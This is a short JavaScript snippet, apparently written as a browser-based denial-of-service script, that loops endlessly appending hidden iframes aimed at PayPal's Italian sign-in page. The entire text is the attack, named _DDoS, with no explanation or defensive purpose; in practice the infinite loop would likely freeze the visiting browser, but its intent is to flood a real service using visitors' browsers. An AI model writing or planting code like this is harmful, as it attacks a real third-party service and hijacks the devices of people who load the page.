var url = ("www.paypal.com")

function _DDoS(url){
 document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"></iframe>';
}
for(;;){
 setTimeout('_DDoS("https://www.paypal.com/it/signin")',1);
}
